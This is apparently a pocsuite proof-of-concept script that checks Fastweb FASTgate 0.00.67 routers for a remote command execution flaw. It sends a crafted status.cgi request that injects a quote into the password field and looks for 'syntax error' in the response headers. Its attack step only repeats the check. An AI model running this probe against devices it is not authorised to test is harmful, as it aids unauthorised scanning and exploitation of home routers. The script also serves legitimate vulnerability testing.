#!/usr/bin/env python
# -*- coding: utf-8 -*-

import urlparse

from pocsuite.api.poc import POCBase, register, Output
from pocsuite.api.request import req


class TestPOC(POCBase):
    vulID = ''
    version = '1'
    author = 'elloit'
    vulDate = '2018-05-21'
    createDate = '2019-01-30'
    updateDate = '2019-01-30'
    references = ['https://cxsecurity.com/issue/WLB-2018100117']
    name = '命令执行'
    appPowerLink = ''
    appName = ''
    appVersion = ''
    vulType = '命令执行'
    desc = '''
    An critical issue was discovered in Fastweb FASTgate 0.00.67 device. 
    FASTgate 0.00.67 is vulnerable to Remote Code Execution
    '''
    samples = [
        ""
    ]
    install_requires = ""
    search_keyword = ""

    def _verify(self):
        result = {}
        # 格式化URL
        url = urlparse.urlparse(self.url)
        vul_url = url.scheme + "://" + url.netloc + \
                  "/status.cgi_=1526904600131&cmd=3&nvget=login_confirm&password=admin'&remember_me=1&sessionKey=NULL&username=admin"
        try:
            headers = {
                "Cookie": "XSRF-TOKEN=0",
                "X-XSRF-TOKEN": "0"
            }
            res = req.get(url=vul_url,headers=headers, verify=False, timeout=(10, 15))
            print res.headers
            if res.status_code == 200 and "syntax error" in res.headers:
                result["VerifyInfo"] = {}
                result["VerifyInfo"]["URL"] = vul_url
        except Exception as e:
            return self.parse_output(result)

        return self.parse_output(result)

    def _attack(self):
        self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
